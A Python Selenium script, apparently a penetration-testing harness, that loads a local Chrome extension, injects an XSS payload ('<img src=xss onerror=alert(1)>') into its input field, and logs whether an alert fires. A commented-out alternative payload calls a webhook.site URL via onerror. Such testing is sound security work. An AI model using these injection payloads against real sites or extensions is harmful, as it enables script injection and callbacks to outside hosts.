import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException


from os import path
import hashlib
import logging

from selenium.common.exceptions import NoAlertPresentException

def logs(driver, alert, result, extension_name, payload):

    # !! [Selenium cant take screenshot of alerts as it occurs outside the DOM] !!
    # driver.save_screenshot("alert_screenshot.png")
    try:
        # Log the info (both success and fail)
        if result == 'Success':
            print('success')
            alert_text = alert.text
            alert.accept()  # Accept the alert window
            logging.critical(f"{time.strftime('%Y-%m-%d %H:%M:%S')}, {result}, {logging.getLevelName(logging.CRITICAL)}, {extension_name}, {alert_text}, {payload}")
        else:
            print('fail')
            logging.error(f"{time.strftime('%Y-%m-%d %H:%M:%S')}, {result}, {logging.getLevelName(logging.info)}, {extension_name}, 'NIL', {payload}")

    except NoAlertPresentException:
        logging.warning("No alert present")
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")





def gui():
    # Getting id of extension [start]
    def get_ext_id(path_to_extension):
        abs_path = path.abspath(path_to_extension)
        m = hashlib.sha256()
        m.update(abs_path.encode("utf-8"))
        ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
        url_path = f"chrome-extension://{ext_id}/popup.html"
        return url_path, abs_path

    url_path, abs_path = get_ext_id('Extensions/h1-replacer/h1-replacer_P')

    options = webdriver.ChromeOptions()
    # Prevent chrome browser from closing and define extension
    options.add_experimental_option('detach', True)
    load_ext_arg = "load-extension="+abs_path
    options.add_argument(load_ext_arg)
    options.add_argument("--enable-logging")
    driver = webdriver.Chrome('./chromedriver', options=options)

    driver.get(url_path)
    original = driver.current_window_handle
    driver.switch_to.new_window('tab')
    new = driver.current_window_handle

    driver.get('https://www.example.com')
    driver.switch_to.window(original)

    # Sending input and clicking buttons
    a = driver.find_element(By.ID, 'replacementInput')
    payload = 'test123'
    payload = '<img src=xss onerror=alert(1)>'
    # payload = '<img src=x onerror="window.open(`https://webhook.site/addca2be-52c9-4cee-8589-408277a63dda`)">'


    a.send_keys(payload)
    button = driver.find_element(By.ID, 'replaceButton')
    button.click()

    driver.switch_to.window(new)

    time.sleep(1)  # Wait for the alert to appear

    try:
        # wait 3 seconds to see if alert is detected
        WebDriverWait(driver, 2).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        logs(driver, alert, 'Success', url_path, payload)
        print('+ Alert Detected +')
    except TimeoutException:
        logs(driver, 'NIL', 'Fail', url_path, payload)
        print('= No alerts detected =')

def main():
    # Configure logging
    logging.basicConfig(
        filename='logs/penetration_testing.txt',
        level=logging.ERROR,
        format='%(asctime)s, %(message)s'
    )

    # Run program
    gui()

if __name__ == '__main__':
    main()
